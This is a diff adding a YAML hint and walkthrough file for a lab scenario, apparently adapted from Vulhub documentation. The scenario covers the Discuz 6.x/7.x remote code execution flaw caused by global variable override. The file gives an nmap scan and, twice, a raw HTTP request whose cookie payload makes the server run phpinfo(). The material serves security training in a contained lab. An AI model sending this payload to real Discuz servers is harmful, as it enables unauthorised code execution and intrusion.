@@ -1,0 +1,92 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: discuz/wooyun-2010-080723
+hint_levels:
+  low:
+  - Inspect the discuz service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8080. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): discuz: 8080/tcp → container 80/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8080/install/`.'
+  high:
+  - 'Vulnerability: Discuz 7.x/6.x Remote Code Execution via Global Variable Override.'
+  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
+    substitutions.
+  - |-
+    Vulnerability Reproduction
+
+    After installation, find an existing post and send a request with the following cookie that contains the payload `GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();`:
+
+    ```
+    GET /viewthread.php?tid=10&extra=page%3D1 HTTP/1.1
+    Host: {{NODE_IP}}:8080
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Accept-Language: en
+    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+    Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
+    Connection: close
+
+
+    ```
+
+    The `phpinfo()` function will be successfully executed, demonstrating the remote code execution vulnerability:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/discuz/wooyun-2010-080723/2.png
+
+    > Note: Some articles online claim that a post with an emoji comment is required, but the actual test found that it was not necessary, and the reason still needs to be analyzed from the code.
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/discuz/wooyun-2010-080723/README.md'
+  - |-
+    Additional public references:
+    - https://www.secpulse.com/archives/2338.html
+access_instructions:
+  title: Discuz 7.x/6.x Remote Code Execution via Global Variable Override
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8080. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): discuz: 8080/tcp → container 80/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8080/install/`.
+  - title: Vulnerability Reproduction
+    instructions: |-
+      After installation, find an existing post and send a request with the following cookie that contains the payload `GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();`:
+
+      ```
+      GET /viewthread.php?tid=10&extra=page%3D1 HTTP/1.1
+      Host: {{NODE_IP}}:8080
+      Accept-Encoding: gzip, deflate
+      Accept: */*
+      Accept-Language: en
+      User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+      Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
+      Connection: close
+
+
+      ```
+
+      The `phpinfo()` function will be successfully executed, demonstrating the remote code execution vulnerability:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/discuz/wooyun-2010-080723/2.png
+
+      > Note: Some articles online claim that a post with an emoji comment is required, but the actual test found that it was not necessary, and the reason still needs to be analyzed from the code.
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/discuz/wooyun-2010-080723/README.md
+  readme_sha256: 89f72cb6fae82fd660be2dde7deb9aa3688411e3c4f9ee3295bab72acabc9ca5
+  compose_sha256: 94e2d3d1ef35f36aad50e965dc5ba2094b5ec226f18070b8a4806cc01778aa00
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
